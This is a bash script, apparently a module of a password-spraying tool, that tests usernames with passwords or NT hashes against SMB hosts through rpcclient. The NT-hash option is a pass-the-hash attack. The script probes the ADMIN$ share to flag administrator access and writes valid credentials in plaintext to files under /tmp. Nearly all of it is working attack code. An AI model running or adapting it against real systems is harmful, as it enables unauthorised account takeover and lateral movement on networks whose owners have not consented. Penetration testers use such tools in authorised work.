#!/bin/bash

SMB_CHECK(){
	check_Portal=$(rpcclient -U "" -N "$1" -c quit);
	if [[ $(echo "$check_Portal" | grep 'Error was NT_STATUS_ACCESS_DENIED') ]] || [[ $(echo $check_Portal) == "" ]] || [[ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] ; then
		:
	else
		echo "SMB Protocol not available";
		echo "Exiting...";
		exit 1;
	fi
}

SMB_AUTH(){
LOG_YES=false;
LOG=/tmp/conformer.log;
#Determine if Logging, and where to log
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "log="* ]]; then
LOG_YES=true;
LOG=$(echo "$5" | grep -i log | cut -d "=" -f 2);
	if [[ "$LOG" == "" ]] ; then
		LOG=$(echo "$6" | grep -i log | cut -d "=" -f 2);
		if [[ "$LOG" == "" ]] ; then
			LOG=$(echo "$7" | grep -i log | cut -d "=" -f 2);
			if [[ "$LOG" == "" ]] ; then
				LOG=$(echo "$8" | grep -i log | cut -d "=" -f 2);
			fi
		fi
	fi
if [[ -d "$LOG" ]] ; then
	LOG_YES=false;
fi
fi


DEBUG_YES=false;
DEBUG=/tmp/conformer.debug;
#Determine if Debuging, and where to debug to.
if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "debug="* ]] || [[ $(echo "$8" | tr '[:upper:]' '[:lower:]') == "debug="* ]]; then
DEBUG_YES=true;
DEBUG=$(echo "$5" | grep -i debug | cut -d "=" -f 2);
	if [[ "$DEBUG" == "" ]] ; then
		DEBUG=$(echo "$6" | grep -i debug | cut -d "=" -f 2);
		if [[ "$DEBUG" == "" ]] ; then
			DEBUG=$(echo "$7" | grep -i debug | cut -d "=" -f 2);
			if [[ "$DEBUG" == "" ]] ; then
				DEBUG=$(echo "$8" | grep -i debug | cut -d "=" -f 2);
			fi
		fi
	fi
if [[ -d "$DEBUG" ]] ; then
	DEBUG_YES=false;
fi
fi


#SMB Auth request
if [[ $(echo "$pass" | wc -m) != 33 ]] ; then
REPLY=$(rpcclient -U "$line%$pass" -c "getusername;quit" "$1");
else
REPLY=$(rpcclient -U "$line%$pass" --pw-nt-hash -c "getusername;quit" "$1");
pass=$pass"(*NTHASH*)";
fi

			if [[ $REPLY == "Account Name:"* ]] || [[ $REPLY == *"NT_STATUS_PASSWORD_MUST_CHANGE"* ]]  || [[ $REPLY == *"STATUS_PASSWORD_EXPIRED"* ]] ; then

				if [[ $(echo "$pass" | wc -m) != 43 ]] ; then
				admin_rights=$(smbclient -U "$line"%"$pass" //"$1"/ADMIN$ -c "pwd;quit" 2> /dev/null);
				else
				admin_rights=$(smbclient -U "$line"%"$pass" //"$1"/ADMIN$ --pw-nt-hash -c "pwd;quit" 2> /dev/null);
				fi

				admin_out="";
				if [[ "$admin_rights" ==  *"Current directory"* ]]; then
					admin_out="[ADMIN ACCESS]";			
				else
					admin_out="";
				fi
			
				echo "	$line:$pass:**Success** $admin_out";
					if [[ $DEBUG_YES == true ]]; then
						echo "host:$1 username:$line password:$pass" >> "$DEBUG";
						echo "" >> "$DEBUG";			
						echo "$REPLY" >> "$DEBUG";
						echo "" >> "$DEBUG";	
						echo "-------------------------------------------------------------" >> "$DEBUG";	
					fi
					# Logging
					if [[ $LOG_YES == true ]]; then
						echo "	$line:$pass:**Success** $admin_out" >> "$LOG";
					fi
			elif [[ $REPLY == "Cannot connect"* ]] ; then
				echo "	$line:$pass:Fail";
					if [[ $DEBUG_YES == true ]]; then
						echo "host:$1 username:$line password:$pass" >> "$DEBUG";
						echo "" >> "$DEBUG";			
						echo "$REPLY" | cut -d " " -f 8 >> "$DEBUG";
						echo "" >> "$DEBUG";	
						echo "-------------------------------------------------------------" >> "$DEBUG";	
					fi

					if [[ $LOG_YES == true ]]; then
						echo "	$line:$pass:Fail" >> "$LOG";
					fi
		fi


}
